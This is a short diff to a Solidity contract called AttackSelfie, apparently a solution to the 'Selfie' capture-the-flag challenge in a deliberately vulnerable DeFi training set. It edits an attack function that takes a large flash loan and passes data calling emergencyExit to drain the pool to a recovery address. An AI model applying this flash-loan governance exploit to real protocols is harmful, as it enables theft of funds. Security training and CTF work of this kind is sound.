@@ -49,16 +49,16 @@ contract AttackSelfie is IERC3156FlashBorrower {
         return CALLBACK_SUCCESS;
     }
 
-    function attackSetup(address recovery) external returns(bool) {
+    function attackSetup(address recovery) external {
         uint amountRequired = 1500000 ether;
         bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
-        require(pool.flashLoan(
+        
+        pool.flashLoan(
             IERC3156FlashBorrower(address(this)),
             address(damnValuableToken),
             amountRequired,
             data
-        ));
-        return true;
+        );
     }
 
     function attackCloseup() external returns(bool) {
